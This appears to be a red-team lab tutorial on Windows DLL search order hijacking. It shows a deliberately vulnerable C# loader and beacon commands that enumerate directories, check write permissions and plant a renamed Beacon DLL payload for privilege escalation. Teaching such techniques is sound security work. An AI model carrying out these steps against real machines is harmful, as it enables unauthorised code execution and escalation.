DLLs (Dynamic-Link Libraries) are PE files containing reusable functions that applications can load. Windows provides DLLs such as `kernel32.dll` and `user32.dll`; developers can also create custom DLLs.

Applications usually reference DLLs by name rather than full path, because Windows or applications may be installed in different locations. Windows searches for the DLL using a defined DLL search order.
## How Hijacking Works
DLL search order hijacking occurs when an attacker places a malicious DLL with the same name in a directory searched before the legitimate DLL.

If the application runs with elevated privileges, the malicious DLL may execute with those privileges, potentially resulting in privilege escalation.

### Example 
This code loads `BadDll.dll` using a relative name through `LoadLibrary`, but that DLL is not present in the executable's directory.

```C#
private void LoadDll()
{
    const string moduleName = "BadDll.dll";
    while (!_cts.IsCancellationRequested)
    {
        try
        {
            // load module
            var hModule = Win32.LoadLibraryA(moduleName);
            if (hModule == IntPtr.Zero)
                continue;
            // unload module
            Win32.FreeLibrary(hModule);
        }
        catch
        {
            // pokemon
        }
        Thread.Sleep(new TimeSpan(0, 1, 0));
    }
}
```

### 1. Inspect the executable directory
```
beacon> ls "C:\Program Files\Bad Windows Service\Service Executable"
```
The directory contains only `BadWindowsService.exe`.

### 2. Inspect the PATH variable
The system PATH includes: `C:\Program Files\Bad Windows Service`
```
beacon> env

C:\Program Files\Bad Windows Service
```
Listing that directory reveals the legitimate `BadDll.dll` is stored there.
```
beacon> ls C:\Program Files\Bad Windows Service

 10kb     fil     01/06/2025 16:10:12   BadDll.dll
```

### 3. Identify a hijack location
The application's executing directory is searched before the directory in PATH. If the executing directory is writable, a DLL placed there may be loaded instead of the legitimate one.

Check permissions:
```
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
```

Example result:
```
NT AUTHORITY\Authenticated Users:(CI)(OI)F
```
`F` means Full Control, so authenticated users can modify the directory and its contents.

### 4. Hijacking it
To perform the hijack, simply upload a Beacon DLL payload into this directory, and call it `BadDll.dll`.
```
beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.dll
beacon> mv dns_x64.dll BadDll.dll
```
